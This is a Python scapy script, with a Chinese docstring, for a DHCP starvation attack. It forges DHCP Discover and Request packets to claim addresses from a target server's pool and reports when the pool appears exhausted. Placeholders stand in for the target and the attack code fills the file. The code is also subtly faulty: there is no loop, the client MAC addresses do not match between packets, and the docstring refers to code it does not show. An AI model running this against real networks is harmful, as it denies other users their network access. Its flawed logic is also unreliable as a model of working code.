#!/usr/bin/env python3
# -*- coding: UTF-8 -*-

"""
在抢占DHCP地址池后，如果DHCP服务器的地址池已被消耗殆尽，则DHCP服务器将无法分配新的IP地址。
在这种情况下，DHCP服务器会发送DHCP NAK（Negative Acknowledgement）包来响应DHCP客户端的请求。
因此，如果我们在抢占DHCP地址池时发现DHCP服务器返回DHCP NAK包，则说明DHCP地址池已被消耗殆尽，
程序可以在此时停止抢占，并给出相应的提示信息。
具体实现时，可以在DHCP Request包被成功发送之后，再使用sniff函数抓取DHCP NAK包，如果抓到了NAK包，
则说明DHCP地址池已被消耗殆尽。代码如下：

在上述代码中，我们使用if语句判断是否抓到了DHCP ACK或NAK包，如果抓到了，
根据DHCP包的message-type字段来判断是ACK还是NAK。如果抓到了NAK包，则说明DHCP地址池已被消耗殆尽，程序将打印提示信息。
"""


from scapy.all import *

# 目标IP地址、MAC地址、网卡名和DHCP服务器IP地址
victim_ip = "TARGET_IP"
victim_mac = "TARGET_MAC"
iface = "INTERFACE_NAME"
dhcp_server = "SERVER_IP"

# 构造DHCP Discover包，并将其发送到目标IP地址
discover_pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / \
               IP(src="0.0.0.0", dst="255.255.255.255") / \
               UDP(sport=68, dport=67) / \
               BOOTP(chaddr=RandMAC(), xid=RandInt()) / \
               DHCP(options=[("message-type", "discover"),
                              "end"])
sendp(discover_pkt, iface=iface)

# 抓取DHCP Offer包，并提取出其中的相关信息
offer_pkt = sniff(filter="udp and port 67 and port 68 and src " + dhcp_server, count=1)[0]
offer_ip = offer_pkt.getlayer(BOOTP).yiaddr
transaction_id = offer_pkt.getlayer(BOOTP).xid
server_ip = offer_pkt.getlayer(IP).src

# 构造DHCP Request包，并将其发送到DHCP服务器，请求使用offer_ip地址
request_pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / \
              IP(src="0.0.0.0", dst="255.255.255.255") / \
              UDP(sport=68, dport=67) / \
              BOOTP(chaddr=victim_mac, xid=transaction_id) / \
              DHCP(options=[("message-type", "request"),
                             ("server_id", server_ip),
                             ("requested_addr", offer_ip),
                             "end"])
sendp(request_pkt, iface=iface)

# 抓取DHCP ACK或NAK包，并根据情况打印提示信息
reply_pkt = sniff(filter="udp and port 67 and port 68 and src " + dhcp_server, count=1)
if not reply_pkt:
    print("Error: no reply packet received.")
elif reply_pkt[0].getlayer(DHCP).options[0][1] == 5:
    print("IP address %s has been successfully grabbed." % offer_ip)
else:
    print("Error: DHCP pool has been exhausted.")
